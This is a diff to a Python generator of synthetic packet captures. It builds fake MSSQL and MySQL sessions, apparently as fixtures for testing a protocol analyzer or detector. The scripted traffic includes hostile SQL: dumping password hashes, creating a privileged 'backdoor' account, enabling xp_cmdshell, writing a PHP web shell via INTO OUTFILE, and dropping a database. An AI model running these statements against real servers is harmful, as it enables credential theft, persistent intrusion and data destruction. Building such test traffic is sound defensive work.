@@ -1283,6 +1283,203 @@ def write_memcache_pcap(path):
     write_pcap(path, memcache_packets())
 
 
+# ---------------------------------------------------------------- Microsoft SQL Server (TDS)
+#
+# Shaped on a capture of SQL Server 2022 (16.0.4305) and python-tds.
+# CLIENT:42400 logs in as sa with the wrong password (18456), encryption
+# not supported on either side. CLIENT:42401 logs in as sa (Str0ng!Passw0rd)
+# from SQLCMD on host attacker, reads the logins' password hashes, creates
+# a login (Bd00r!x9z) and makes it sysadmin, turns on xp_cmdshell and
+# runs it (refused: 15281), drops a database, runs a query through
+# sp_executesql and calls a stored procedure. CLIENT:42402 encrypts only
+# its login - the user hidden, the SQL after it not. CLIENT:42403's server
+# requires encryption: the pre-login is all there is.
+
+MSSQL_SERVER = '198.51.100.100'
+
+
+def _tds(kind, payload, packet=1):
+    return struct.pack('!BBHHBB', kind, 0x01, 8 + len(payload), 0, packet, 0) + payload
+
+
+def _tds_prelogin(kind, encryption):
+    options = [(0, bytes.fromhex('100010d10000')), (1, bytes([encryption])), (2, b'\x00'), (3, b'\x00\x00\x00\x00'),
+               (4, b'\x00')]
+    at, head, data = 5 * len(options) + 1, b'', b''
+    for token, value in options:
+        head += struct.pack('!BHH', token, at + len(data), len(value))
+        data += value
+    return _tds(kind, head + b'\xff' + data)
+
+
+def _tds_obfuscate(password):
+    return bytes((((b << 4) & 0xf0) | (b >> 4)) ^ 0xa5 for b in password.encode('utf-16-le'))
+
+
+def _tds_login7(user, password, database='master'):
+    values = [('attacker', None), (user, None), (password, 'password'), ('SQLCMD', None), ('198.51.100.100', None),
+              ('', None), ('Python TDS Library', None), ('', None), (database, None)]
+    at, offsets, data = 94, b'', b''
+    for text, kind in values:
+        raw = _tds_obfuscate(text) if kind else text.encode('utf-16-le')
+        offsets += struct.pack('<HH', at + len(data), len(text))
+        data += raw
+    offsets += b'\x00' * 6 + struct.pack('<HHHHHHI', at + len(data), 0, at + len(data), 0, at + len(data), 0, 0)
+    head = struct.pack('<IIIIII', 94 + len(data), 0x74000004, 4096, 7, 4242, 0) + bytes([0xe0, 0x03, 0, 0]) + struct.pack('<iI', 0, 0x409)
+    return _tds(0x10, head + offsets + data)
+
+
+def _tds_loginack():
+    name = 'Microsoft SQL Server'.encode('utf-16-le')
+    body = b'\x01' + struct.pack('>I', 0x74000004) + bytes([len(name) // 2]) + name + bytes([16, 0, 0x10, 0xd1])
+    return b'\xad' + struct.pack('<H', len(body)) + body
+
+
+def _tds_done(rows=0, error=False):
+    return b'\xfd' + struct.pack('<HHQ', (0x10 if rows else 0) | (0x02 if error else 0), 0xc1, rows)
+
+
+def _tds_error(number, message, severity=14):
+    text = message.encode('utf-16-le')
+    server = 'sqlsrv'.encode('utf-16-le')
+    body = struct.pack('<IBB', number, 1, severity) + struct.pack('<H', len(text) // 2) + text + bytes([len(server) // 2]) + server + b'\x00' + struct.pack('<I', 1)
+    return b'\xaa' + struct.pack('<H', len(body)) + body
+
+
+_TDS_HEADERS = struct.pack('<IIHQI', 22, 18, 2, 0, 1)
+
+
+def _tds_batch(sql):
+    return _tds(1, _TDS_HEADERS + sql.encode('utf-16-le'))
+
+
+def _tds_executesql(sql):
+    text = sql.encode('utf-16-le')
+    params = 'N\'@P1 nvarchar(4000)\''.encode('utf-16-le')
+    statement = b'\x00\x00\xe7\xff\xff\x09\x04\xd0\x00\x34' + b'\xfe' + b'\xff' * 7 + struct.pack('<I', len(text)) + text + b'\x00' * 4
+    declaration = b'\x00\x00\xe7\x40\x1f\x09\x04\xd0\x00\x34' + struct.pack('<H', len(params)) + params
+    return _tds(3, _TDS_HEADERS + b'\xff\xff\x0a\x00\x00\x00' + statement + declaration)
+
+
+def _tds_procedure(name):
+    text = name.encode('utf-16-le')
+    return _tds(3, _TDS_HEADERS + struct.pack('<H', len(text) // 2) + text + b'\x00\x00')
+
+
+def mssql_packets():
+    failed = [(True, _tds_prelogin(0x12, 2)), (False, _tds_prelogin(4, 2)), (True, _tds_login7('sa', 'WrongPassword1')),
+              (False, _tds(4, _tds_error(18456, "Login failed for user 'sa'.") + _tds_done(error=True)))]
+    session = [(True, _tds_prelogin(0x12, 2)), (False, _tds_prelogin(4, 2)), (True, _tds_login7('sa', 'Str0ng!Passw0rd')),
+               (False, _tds(4, _tds_loginack() + _tds_done()))]
+    for request, reply in ((_tds_batch('SELECT name, password_hash FROM sys.sql_logins'), _tds_done(3)),
+                           (_tds_batch("CREATE LOGIN backdoor WITH PASSWORD = 'Bd00r!x9z', CHECK_POLICY = OFF"), _tds_done()),
+                           (_tds_batch('ALTER SERVER ROLE sysadmin ADD MEMBER backdoor'), _tds_done()),
+                           (_tds_batch("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE"), _tds_done()),
+                           (_tds_batch("EXEC xp_cmdshell 'whoami'"),
+                            _tds_error(15281, "SQL Server blocked access to procedure 'sys.xp_cmdshell'.", 16) + _tds_done(error=True)),
+                           (_tds_batch('DROP DATABASE shop'), _tds_done()),
+                           (_tds_executesql('SELECT name FROM sys.databases WHERE name = @P1'), _tds_done(1)),
+                           (_tds_procedure('dbo.p_GetOrders'), _tds_done(12))):
+        session += [(True, request), (False, _tds(4, reply))]
+    login_only = [(True, _tds_prelogin(0x12, 0)), (False, _tds_prelogin(4, 0)),
+                  (True, _tds(0x12, b'\x16\x03\x03\x00\x10' + bytes(16))), (False, _tds(4, _tds_loginack() + _tds_done())),
+                  (True, _tds_batch('SELECT 1')), (False, _tds(4, _tds_done(1)))]
+    everything = [(True, _tds_prelogin(0x12, 0)), (False, _tds_prelogin(4, 3)), (True, _tds(0x12, b'\x16\x03\x03\x00\x10' + bytes(16)))]
+    return (tcp_segments(CLIENT, MSSQL_SERVER, 42400, 1433, failed) + tcp_segments(CLIENT, MSSQL_SERVER, 42401, 1433, session)
+            + tcp_segments(CLIENT, MSSQL_SERVER, 42402, 1433, login_only) + tcp_segments(CLIENT, MSSQL_SERVER, 42403, 1433, everything))
+
+
+def write_mssql_pcap(path):
+    write_pcap(path, mssql_packets())
+
+
+# ---------------------------------------------------------------- MySQL
+#
+# Shaped on a capture of MariaDB 11.8 and the mysql client. CLIENT:42300
+# logs in as app with the wrong password (1045). CLIENT:42301 logs in as
+# app to shop and reads customers twice and mysql.user's password hashes,
+# creates a user (its password Bd00r!) and grants it everything, writes a
+# PHP web shell with INTO OUTFILE, queries a table that isn't there
+# (1146), drops the database, and sets app's password. CLIENT:42302 logs
+# in as root with no password. CLIENT:42303 asks for TLS before logging in.
+
+MYSQL_SERVER = '198.51.100.99'
+
+
+def _mysql(seq, payload):
+    return struct.pack('<I', len(payload))[:3] + bytes([seq]) + payload
+
+
+def _mysql_lenenc(data):
+    return bytes([len(data)]) + data
+
+
+def _mysql_greeting():
+    salt = b'abcdefgh'
+    return _mysql(0, b'\x0a' + b'11.8.6-MariaDB-0+deb13u1\x00' + struct.pack('<I', 31) + salt + b'\x00'
+                  + struct.pack('<HBHH', 0xf7fe, 45, 0x0002, 0x81ff) + b'\x15' + b'\x00' * 10 + b'ijklmnopqrst\x00'
+                  + b'mysql_native_password\x00')
+
+
+def _mysql_login(user, database=None, password=True, ssl=False):
+    caps = 0x001aa285 | (0x08 if database else 0) | (0x800 if ssl else 0)
+    head = struct.pack('<IIB', caps, 16777216, 45) + b'\x00' * 23
+    if ssl:
+        return _mysql(1, head)
+    attrs = b''.join(_mysql_lenenc(k.encode()) + _mysql_lenenc(v.encode()) for k, v in
+                     (('_os', 'Linux'), ('_client_name', 'libmariadb'), ('_pid', '1649'), ('_client_version', '3.4.9'),
+                      ('_platform', 'x86_64'), ('program_name', 'mysql')))
+    auth = bytes(range(1, 21)) if password else b''
+    return _mysql(1, head + user.encode() + b'\x00' + _mysql_lenenc(auth) + (database.encode() + b'\x00' if database else b'')
+                  + b'mysql_native_password\x00' + _mysql_lenenc(attrs))
+
+
+def _mysql_ok(seq, rows=0):
+    return _mysql(seq, b'\x00' + bytes([rows, 0]) + struct.pack('<HH', 0x0002, 0))
+
+
+def _mysql_err(seq, code, state, message):
+    return _mysql(seq, b'\xff' + struct.pack('<H', code) + b'#' + state.encode() + message.encode())
+
+
+def _mysql_rows(column, rows):
+    lenenc = _mysql_lenenc
+    definition = (lenenc(b'def') + lenenc(b'shop') + lenenc(b't') + lenenc(b't') + lenenc(column.encode())
+                  + lenenc(column.encode()) + b'\x0c' + struct.pack('<HIBHB', 45, 160, 253, 0, 0) + b'\x00\x00')
+    eof = lambda seq: _mysql(seq, b'\xfe\x00\x00\x02\x00')
+    out = _mysql(1, b'\x01') + _mysql(2, definition) + eof(3)
+    for i, row in enumerate(rows):
+        out += _mysql(4 + i, lenenc(row.encode()))
+    return out + eof(4 + len(rows))
+
+
+def mysql_packets():
+    query = lambda sql: _mysql(0, b'\x03' + sql.encode())
+    failed = [(False, _mysql_greeting()), (True, _mysql_login('app', password=True)),
+              (False, _mysql_err(2, 1045, '28000', "Access denied for user 'app'@'10.1.0.10' (using password: YES)"))]
+    session = [(False, _mysql_greeting()), (True, _mysql_login('app', 'shop')), (False, _mysql_ok(2))]
+    for sql, reply in (('SELECT * FROM customers', _mysql_rows('name', ['Ann', 'Bob'])),
+                       ('SELECT * FROM customers', _mysql_rows('name', ['Ann', 'Bob'])),
+                       ('SELECT user, host, password FROM mysql.user', _mysql_rows('user', ['root', 'app'])),
+                       ("CREATE USER 'backdoor'@'%' IDENTIFIED BY 'Bd00r!'", _mysql_ok(1)),
+                       ("GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION", _mysql_ok(1)),
+                       ("""SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php'""", _mysql_ok(1, 1)),
+                       ('SELECT * FROM nosuchtable', _mysql_err(1, 1146, '42S02', "Table 'shop.nosuchtable' doesn't exist")),
+                       ('DROP DATABASE shop', _mysql_ok(1, 1)),
+                       ("SET PASSWORD FOR 'app'@'%' = PASSWORD('n3wPass')", _mysql_ok(1))):
+        session += [(True, query(sql)), (False, reply)]
+    session.append((True, _mysql(0, b'\x01')))
+    root = [(False, _mysql_greeting()), (True, _mysql_login('root', password=False)), (False, _mysql_ok(2)),
+            (True, query('select @@version_comment limit 1')), (False, _mysql_rows('@@version_comment', ['Debian']))]
+    ssl = [(False, _mysql_greeting()), (True, _mysql_login('', ssl=True)), (True, b'\x16\x03\x01\x00\x05' + bytes(5))]
+    return (tcp_segments(CLIENT, MYSQL_SERVER, 42300, 3306, failed) + tcp_segments(CLIENT, MYSQL_SERVER, 42301, 3306, session)
+            + tcp_segments(CLIENT, MYSQL_SERVER, 42302, 3306, root) + tcp_segments(CLIENT, MYSQL_SERVER, 42303, 3306, ssl))
+
+
+def write_mysql_pcap(path):
+    write_pcap(path, mysql_packets())
+
+
 # ---------------------------------------------------------------- Oracle TNS
 #
 # CLIENT:41500 connects to TNS_SERVER's listener for service FIXDB and logs
